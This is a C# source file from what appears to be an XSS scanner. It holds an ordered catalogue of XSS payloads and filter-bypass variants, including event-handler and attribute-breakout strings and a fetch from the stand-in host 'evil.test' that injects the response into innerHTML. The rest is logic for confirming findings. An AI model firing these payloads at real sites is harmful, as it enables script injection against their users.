using System.Text.RegularExpressions;

namespace Trowser.Security;

/// <summary>
/// Ordered XSS bypass probes for auto-bypass tracing. When a primary payload is filtered,
/// subsequent vectors (event handlers, attribute breakouts, etc.) are tried automatically.
/// </summary>
public static class XssBypassProbes
{
    public const string DefaultPrimaryPayload = "<script>alert(1)</script>";

    public sealed record Probe(string Vector, string Payload, string Description);

    /// <summary>Primary probe first, then bypass alternatives in decreasing likelihood.</summary>
    public static IReadOnlyList<Probe> Catalog { get; } =
    [
        new("script-tag", DefaultPrimaryPayload, "Classic script element"),
        new("img-onerror", "<img src=x onerror=alert(1)>", "Image onerror event handler"),
        new("svg-onload", "<svg onload=alert(1)>", "SVG onload event handler"),
        new("attribute-breakout-dquote", "\"><script>alert(1)</script>", "Double-quote attribute breakout + script"),
        new("img-onerror-quoted", "<img src=\"x\" onerror=\"alert(1)\">", "Quoted img onerror handler"),
        new("details-ontoggle", "<details open ontoggle=alert(1)>", "Details ontoggle handler"),
        new("input-autofocus", "<input onfocus=alert(1) autofocus>", "Input autofocus onfocus handler"),
        new("attribute-breakout-squote", "'><img src=x onerror=alert(1)>", "Single-quote attribute breakout + img"),
        new("svg-encoded-script", "<svg><script>alert&#40;1&#41;</script>", "HTML-encoded script inside SVG"),
        new("body-onload", "<body onload=alert(1)>", "Body onload event handler"),
        new("select-onchange", "<select onchange=alert(1)><option>1</option><option>2</option></select>", "Select onchange handler"),
        new("textarea-autofocus", "<textarea onfocus=alert(1) autofocus>", "Textarea autofocus onfocus handler"),
        new("img-slash-bypass", "<img/src=x onerror=confirm(1)>", "Tag syntax variant img onerror"),
        new("marquee-onstart", "<marquee onstart=alert(1)>", "Marquee onstart handler"),
        new("video-onerror", "<video><source onerror=alert(1)>", "Video source onerror handler"),
    ];

    /// <summary>Vectors for eval / Function / setTimeout(string) DOM XSS (hash/documentURI sources).</summary>
    public static IReadOnlyList<Probe> JsContextCatalog { get; } =
    [
        new("js-alert", "alert(1)", "Direct JS expression for eval/Function sinks"),
        new("js-template", "`${alert(1)}`", "Template literal for Function/ eval"),
        new("js-oneline", "1;alert(1)//", "Statement break for eval"),
        new("js-fetch-inner", "fetch('//evil.test').then(r=>r.text()).then(t=>document.body.innerHTML=t)", "Fetch-then-innerHTML chain"),
    ];

    public static string[] BypassPayloadStrings =>
        Catalog.Select(p => p.Payload).ToArray();

    public static IEnumerable<Probe> GetBypassCandidates(string primaryPayload, int maxAttempts)
    {
        var seen = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { primaryPayload };
        var count = 0;
        foreach (var probe in Catalog)
        {
            if (!seen.Add(probe.Payload)) continue;
            yield return probe;
            if (++count >= maxAttempts) yield break;
        }
    }

    public static IEnumerable<Probe> GetBypassCandidatesForUrlDom(string primaryPayload, int maxAttempts, bool includeJsContext)
    {
        var seen = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { primaryPayload };
        var count = 0;
        IEnumerable<Probe> ordered = includeJsContext
            ? JsContextCatalog.Concat(Catalog)
            : Catalog;
        foreach (var probe in ordered)
        {
            if (!seen.Add(probe.Payload)) continue;
            yield return probe;
            if (++count >= maxAttempts) yield break;
        }
    }

    public static string ClassifyVector(string payload)
    {
        var match = Catalog.FirstOrDefault(p =>
            p.Payload.Equals(payload, StringComparison.OrdinalIgnoreCase));
        if (match != null) return match.Vector;

        if (payload.Contains("<script", StringComparison.OrdinalIgnoreCase)) return "script-tag";
        if (Regex.IsMatch(payload, @"<img[^>]+onerror", RegexOptions.IgnoreCase)) return "img-onerror";
        if (Regex.IsMatch(payload, @"<svg[^>]+onload", RegexOptions.IgnoreCase)) return "svg-onload";
        if (Regex.IsMatch(payload, @"on\w+\s*=", RegexOptions.IgnoreCase)) return "event-handler";
        if (XssReflectionAnalyzer.IsJavascriptUriPayload(payload)) return "javascript-uri";
        return "custom";
    }

    /// <summary>True when an effect oracle fired (execution, dialog, or verified off-site navigation).</summary>
    public static bool IsConfirmedXss(InputTraceResult trace)
    {
        if (trace.Sinks?.ExecutionConfirmed == true && trace.Csp?.WouldBlock != true)
            return true;

        if (trace.Sinks?.DialogEffectConfirmed == true && trace.Csp?.WouldBlock != true)
            return true;

        if (trace.Csp?.WouldBlock != true
            && TraceInputRedirectHelper.PayloadTargetsOffSiteNavigation(trace.Payload)
            && TraceInputRedirectHelper.DocumentMatchesRedirectPayload(trace.DocumentUrl, trace.Payload))
            return true;

        return false;
    }

    /// <summary>Payload reached a dangerous sink with executable context (not filing-grade XSS by itself).</summary>
    public static bool IsSinkReachConfirmed(InputTraceResult trace)
    {
        if (trace.Sinks is not { PayloadReachedSink: true } sinks || sinks.Hits.Count == 0)
            return false;

        var pageUrl = !string.IsNullOrWhiteSpace(trace.DocumentUrl)
            ? trace.DocumentUrl
            : trace.Injection.NavigatedUrl ?? trace.Network?.Url ?? "";

        if (XssReflectionAnalyzer.SinkHitsAreDocumentUrlEchoOnly(trace.Payload, pageUrl, sinks.Hits))
            return false;
        if (XssReflectionAnalyzer.SinkHitsAreBenignSearchOrApiOnly(trace.Payload, sinks))
            return false;
        if (XssReflectionAnalyzer.IsSinkReachSafeDespiteDom(trace.Payload, sinks, trace.Dom))
            return false;
        if (TraceInputReachCanary.IsReachCanary(trace.Payload))
            return false;
        if (XssReflectionAnalyzer.IsSinkPayloadUrlEncodedNeutralized(sinks, trace.Dom))
            return false;

        return sinks.Hits.Any(h => h.ContainsPayload);
    }

    private static bool LooksLikeNonHtmlResponse(InputTraceResult.ServerResponseTrace? response)
    {
        if (response == null) return false;
        var ct = response.ContentType;
        if (!string.IsNullOrWhiteSpace(ct))
        {
            if (ct.Contains("html", StringComparison.OrdinalIgnoreCase)) return false;
            if (ct.Contains("json", StringComparison.OrdinalIgnoreCase)
                || ct.Contains("octet-stream", StringComparison.OrdinalIgnoreCase)
                || ct.Contains("text/plain", StringComparison.OrdinalIgnoreCase)
                || ct.Contains("image/", StringComparison.OrdinalIgnoreCase)
                || ct.Contains("application/", StringComparison.OrdinalIgnoreCase))
                return true;
        }

        return response.Reflections.Any(r =>
            r.Context is "json" or "text-plain" or "non-html");
    }

    /// <summary>
    /// Whether auto-bypass should run after the primary probe (avoids pointless retries on clearly safe echoes).
    /// </summary>
    public static bool ShouldAttemptBypass(InputTraceResult primary, string primaryPayload)
    {
        if (IsConfirmedXss(primary) || IsSinkReachConfirmed(primary))
            return false;

        if (TraceInputOptions.IsUrlSource(primary.Injection.SourceType))
            return true;

        if (primary.ServerResponse?.PayloadReflected != true)
            return true;

        if (primary.Injection.Treatment is "filtered" or "constrained" or "encoded")
            return true;

        if (primary.ServerResponse.Reflections.All(r => r.Encoded))
            return true;

        if (primary.Verdict.Severity == Severity.Low
            && primary.Dom is { Dangerous: false, PayloadRendered: true }
            && XssReflectionAnalyzer.IsJavascriptUriPayload(primaryPayload))
        {
            return false;
        }

        return !IsConfirmedXss(primary) && !IsSinkReachConfirmed(primary);
    }

    /// <summary>Stricter bar for xss-scan DOM findings — requires effect or verified active DOM.</summary>
    public static bool IsConfirmedDomXssForScan(InputTraceResult trace)
    {
        if (IsConfirmedXss(trace))
            return true;

        if (trace.Sinks?.ExecutionConfirmed == true && trace.Csp?.WouldBlock != true)
            return true;

        if (trace.Dom is { PayloadRendered: true, Dangerous: true }
            && XssReflectionAnalyzer.DomEvidenceIsPayloadCausal(trace.Payload, trace.Dom)
            && trace.Sinks is { PayloadReachedSink: true }
            && trace.Csp?.WouldBlock != true
            && TraceInputOptions.IsUrlSource(trace.Injection.SourceType))
            return true;

        return false;
    }

    public static string DescribePrimaryOutcome(InputTraceResult primary)
    {
        if (primary.Sinks?.PayloadReachedSink == true
            && XssReflectionAnalyzer.SinkHitsAreBenignSearchOrApiOnly(primary.Payload, primary.Sinks))
        {
            return "Form input was sent to a search/API query parameter (expected behavior — not DOM XSS).";
        }

        if (IsConfirmedXss(primary))
            return "Primary probe confirmed XSS (effect oracle).";

        if (IsSinkReachConfirmed(primary))
            return $"Primary probe reached sink ({primary.Sinks?.MostDangerousSink}) — confirm with confirmExecution or verify.";

        if (TraceInputOptions.IsUrlSource(primary.Injection.SourceType))
        {
            if (primary.Sinks?.PayloadReachedSink == true)
            {
                if (XssReflectionAnalyzer.IsSinkPayloadUrlEncodedNeutralized(primary.Sinks, primary.Dom))
                    return "URL-source probe reached sink but payload was URL-encoded — not exploitable in this context.";
                return $"URL-source probe reached sink ({primary.Sinks.MostDangerousSink}).";
            }
            if (primary.Dom?.Dangerous == true)
                return "URL-source probe rendered active content in DOM.";
            return "URL-source probe did not confirm exploitable DOM XSS.";
        }

        if (primary.Injection.Treatment is "filtered" or "constrained")
            return $"Primary form probe limited by control ({primary.Injection.Treatment}) — URL vectors may still work.";

        if (primary.Injection.Treatment == "encoded")
            return $"Primary probe encoded client-side ({primary.Injection.Encoding}).";

        if (primary.ServerResponse?.PayloadReflected != true)
            return "Primary probe not reflected in server response (likely stripped or rejected).";

        if (primary.ServerResponse.Reflections.Count > 0
            && primary.ServerResponse.Reflections.All(r => r.Encoded))
        {
            return "Primary probe reflected but encoded in server response.";
        }

        if (primary.ServerResponse.Reflections.Any(r => r.Dangerous)
            && primary.Dom is { PayloadRendered: false } or null)
        {
            return "Primary probe reflected unencoded in server response but not confirmed as active DOM content.";
        }

        if (primary.ServerResponse.Reflections.Any(r => r.Context.Contains("script", StringComparison.OrdinalIgnoreCase))
            && !primary.ServerResponse.Reflections.Any(r => r.Dangerous))
        {
            return "Primary probe reflected inside a script context but appears neutralized.";
        }

        return "Primary probe did not confirm exploitable XSS.";
    }

    public static string? BuildBypassSummary(string primaryPayload, InputTraceResult successfulBypass)
    {
        var primaryVector = ClassifyVector(primaryPayload);
        var bypassVector = TraceInputOptions.IsUrlSource(successfulBypass.Injection.SourceType)
            ? successfulBypass.Injection.SourceType
            : ClassifyVector(successfulBypass.Payload);

        if (primaryVector.Equals(bypassVector, StringComparison.OrdinalIgnoreCase))
            return null;

        return $"'{primaryVector}' appears filtered, but '{bypassVector}' bypasses the filter" +
               (successfulBypass.Dom?.Dangerous == true
                   ? " and renders as active content in the DOM."
                   : successfulBypass.Sinks?.PayloadReachedSink == true
                       ? " and reaches a dangerous JavaScript sink."
                       : " with unencoded dangerous reflection in the server response.");
    }
}
